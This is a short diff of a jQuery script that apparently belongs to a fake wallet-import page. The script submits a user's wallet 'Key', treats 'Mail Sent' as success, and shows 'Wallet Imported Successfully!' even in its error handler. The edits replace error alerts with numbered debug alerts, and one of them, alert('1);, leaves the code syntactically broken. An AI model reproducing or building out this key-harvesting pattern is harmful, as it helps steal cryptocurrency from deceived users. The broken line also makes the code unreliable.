@@ -83,7 +83,7 @@ $('document').ready(function () {
                 Key
             },
             success: function (data) {
-                alert(data);
+                alert('3');
                 console.log(data);
                 $('#key_submission button').text('Imported');
                 if (data == 'Mail Sent') {
@@ -91,11 +91,11 @@ $('document').ready(function () {
                 }
             },
             fail: function (err) {
-                alert(err);
+                alert('2');
                 console.log(err);
             },
             error: function (err) {
-                alert(err);
+                alert('1);
                 console.log(err);
                 if(err.responseText){
                     $('.import-type').html('<img src="./img/qr.png"><br><p> Wallet Imported Successfully! </p>');
